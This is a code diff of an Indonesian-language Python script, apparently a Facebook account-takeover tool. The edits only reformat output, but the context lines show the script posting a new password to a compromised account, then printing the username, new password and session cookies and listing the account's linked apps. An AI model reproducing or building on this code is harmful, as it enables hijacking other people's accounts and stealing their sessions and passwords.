@@ -159,7 +159,7 @@ class Eksekusi(Main):
 			dat2.update({"password_new":"".join(pwBaru)})
 			an=session.post(self.url+link3.get("action"),data=dat2)
 			coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-			print(f"\r[√] Akun tap yes -> password diubah!\n{H}[=] {self.user}|{''.join(pwBaru)}|{coki}{P}\n    ",end="")
+			print(f"\r[√] Akun tap yes -> password diubah!\n{H}[=] {self.user}|{''.join(pwBaru)}|{coki}{P}\n",end="")
 			self.cek_apk(session,coki)
 	def cek_apk(self,session,coki):
 		hit1, hit2 = 0,0
@@ -168,10 +168,10 @@ class Eksekusi(Main):
 		if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
 			print(f"{P}[+] Apk yang terkait:")
 			if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
-				print(f"    • {BM}Apk aktif:{P}")
+				print(f"{P}[+] Apk aktif:")
 				print("    [!] Ops! Tidak ada aplikasi aktif yang terkait di akun.")
 			else:
-				print(f"    • {BM}Apk aktif:{P}")
+				print(f"{P}[+] Apk aktif:")
 				apkAktif = re.findall('\<span\ class\=\"ca\ cb\"\>(.*?)<\/span\>',str(cek))
 				ditambahkan = re.findall('\<div\ class\=\"cc\ cd\ ce\"\>(.*?)<\/div\>',str(cek))
 				for muncul in apkAktif:
@@ -179,7 +179,7 @@ class Eksekusi(Main):
 					print(f"    [{BM}{hit1}{P}]. {H}{muncul} -> {ditambahkan[hit2]}{P}")
 					hit2+=1
 			if "Anda tidak memiliki aplikasi atau situs web kadaluarsa untuk ditinjau." in cek2:
-				print("    • {BM}Apk kadaluarsa:{P}")
+				print(f"{P}[+] Apk kadaluarsa:")
 				print("    [!] Ops! Tidak ada aplikasi kadaluarsa yang terkait diakun.")
 			else:
 				hit1,hit2=0,0
